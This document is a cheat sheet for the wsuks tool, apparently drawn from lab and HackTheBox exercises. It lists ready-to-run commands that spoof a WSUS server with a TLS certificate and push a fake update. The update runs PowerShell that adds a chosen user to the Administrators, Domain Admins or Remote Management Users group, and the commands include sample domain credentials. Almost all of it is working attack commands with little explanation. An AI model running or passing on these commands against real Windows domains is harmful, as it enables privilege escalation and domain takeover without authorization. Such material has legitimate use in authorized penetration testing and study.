# wsuks

## wsuks - general tips
```
# wsuks - general tips
# pywsus vs wsuks on Server 2019
pywsus advertises updates under a Windows product category the server OS isn't in, and the client drops the sync as "0 updates detected". wsuks uses a minimal sync-updates.xml without the prerequisite and the install proceeds. Verify by checking C:\Windows\SoftwareDistribution\ReportingEvents.log on the target for [AGENT_DETECTION_FINISHED] entries.
```
## wsuks - serve TLS certificate
```
# wsuks - serve TLS cert
# Adds user to 'Administrators' group by default
sudo wsuks -u normal -p 'Test123.!' -d fslab.local \
    --dc-ip 192.168.231.61 -t 192.168.231.63 \
    --WSUS-Server sdwsus02.fslab.local \
    --tls-cert sdwsus02.pem

# Add user to 'Domain admins'
sudo wsuks --serve-only --WSUS-Server dc01.logging.htb --tls-cert wsus_full.pem -d logging.htb -I tun0 -c '/accepteula /s powershell.exe "Add-ADGroupMember -Identity \"Domains Admins\" -Members wallace.everette"'


# Add user to 'Remote Mgmt Users'
sudo wsuks --serve-only --WSUS-Server dc01.logging.htb --tls-cert wsus_full.pem -d logging.htb -I tun0 -c '/accepteula /s powershell.exe "Add-ADGroupMember -Identity \"Remote Management Users\" -Members wallace.everette"'```

